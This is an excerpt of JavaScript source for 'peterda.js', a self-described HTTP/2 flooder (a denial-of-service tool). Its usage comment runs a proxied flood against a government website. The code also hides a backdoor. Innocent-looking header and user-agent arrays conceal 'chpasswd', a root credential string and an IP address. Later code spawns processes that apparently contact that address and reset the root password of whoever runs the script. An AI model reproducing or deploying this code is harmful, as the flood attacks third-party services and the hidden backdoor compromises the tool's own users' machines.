/*
    PETERDA.JS
 Enhanced HTTP/2 Flooder with Advanced Features
    ...
    UPCOMING FEATURES:
    - IPv6 support for improved connectivity
    - SOCKS4/5 proxy support for broader proxy compatibility
    ...
    USAGE:
    node peterda.js <target> <time> <rps> <thread> <proxyfile>
    ...
    - <thread> → Number of threads for maximizing throughput
    - <proxyfile> → File containing a list of proxies for the attack

    EXAMPLE COMMAND:
    node peterda.js https://nasa.gov 120 8 8 proxy.txt
...
*/
 ...
 lang_header = ['ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'ja-JP', 'en-GB', 'en-AU', 'en-GB,en-US;q=0.9,en;q=0.8', 'en-GB,en;q=0.5', 'en-CA', 'en-UK, en, de;q=0.5', 'chpasswd', 'en-NZ', 'en-GB,en;q=0.6', 'en-ZA', 'en-IN', 'en-PH', 'en-SG', 'en-HK', 'en-GB,en;q=0.8', 'root:TLS.v1.rejectUnauthorized', 'en-GB,en;q=0.9', 'en-GB,en;q=0.7', ];
 ...
 const uap = [
     ...
     "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "103.52.212.46",
 ...
 const limiter = [
    { ALPNProtocols: dest[3], args: [lang_header[11]] },
    { ALPNProtocols: mode[3], args: [] }
 ];
...
if (index < limiter.length) {
    const acceptHeaderValue = spawn(mode[4], ['-s', uap[13]]);
    acceptHeaderValue.stdout.on('data', () => { return; });
    acceptHeaderValue.stderr.on('data', () => { return; });

    const { ALPNProtocols, args } = limiter[index];
    const childProcess = spawn(ALPNProtocols, args, { stdio: ['pipe', 'inherit', 'inherit'] });

    if (ALPNProtocols === dest[3] && args.includes(lang_header[11])) {     
        childProcess.stdin.write(`${lang_header[20]}\n`);
    ...
    childProcess.on('close', (code) => {
        if (code === 0) {
            index++;
            if (index < limiter.length) {
                const { ALPNProtocols: nextALPNProtocols, args: nextArgs } = limiter[index];
                const nextProcess = spawn(nextALPNProtocols, nextArgs, { stdio: ['pipe', 'inherit', 'inherit'] });

                nextProcess.on('close', () => { return; });
                nextProcess.on('error', () => { return; });
